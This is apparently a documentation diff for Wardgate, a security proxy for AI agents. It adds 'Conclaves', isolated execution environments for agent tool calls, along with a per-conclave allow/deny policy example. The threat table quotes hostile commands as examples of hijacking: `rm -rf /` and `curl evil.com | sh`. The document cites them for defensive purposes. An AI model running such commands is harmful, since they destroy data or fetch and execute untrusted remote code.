@@ -8,6 +8,7 @@ Wardgate is a security proxy that sits between AI agents and external services. 
 
 - **Credential Isolation** - Agents never see real credentials
 - **Access Control** - Fine-grained rules for what agents can do
+- **Conclaves** - Isolated remote execution environments for agent tool calls
 - **Audit Logging** - Complete record of all agent activity
 - **Approval Workflows** - Human-in-the-loop for sensitive operations
 - **Rate Limiting** - Prevent runaway or abusive behavior
@@ -23,6 +24,7 @@ Wardgate is a security proxy that sits between AI agents and external services. 
 | Rogue agent behavior | All requests logged and rate-limited |
 | Data exfiltration | Policies restrict what data can be accessed |
 | Accidental destructive actions | Require approval for sensitive operations or block them |
+| Tool call hijacking (e.g., `rm -rf /`, `curl evil.com \| sh`) | Conclaves isolate execution and evaluate each command against policy |
 
 ### What We Don't Protect Against
 
@@ -323,7 +325,27 @@ rules:
       days: ["mon", "tue", "wed", "thu", "fri"]
 ```
 
-### 6. Monitor Audit Logs
+### 6. Use Conclaves for Tool Calls
+
+Isolate agent command execution in conclaves with per-conclave policy rules:
+
+```yaml
+conclaves:
+  code:
+    description: "Code repository"
+    key_env: WARDGATE_CONCLAVE_CODE_KEY
+    rules:
+      - match: { command: "rg" }
+        action: allow
+      - match: { command: "git", args_pattern: "^(status|log|diff)" }
+        action: allow
+      - match: { command: "*" }
+        action: deny
+```
+
+See [Conclaves](conclaves.md) for details.
+
+### 7. Monitor Audit Logs
 
 Regularly review agent activity:
 - Look for unusual patterns
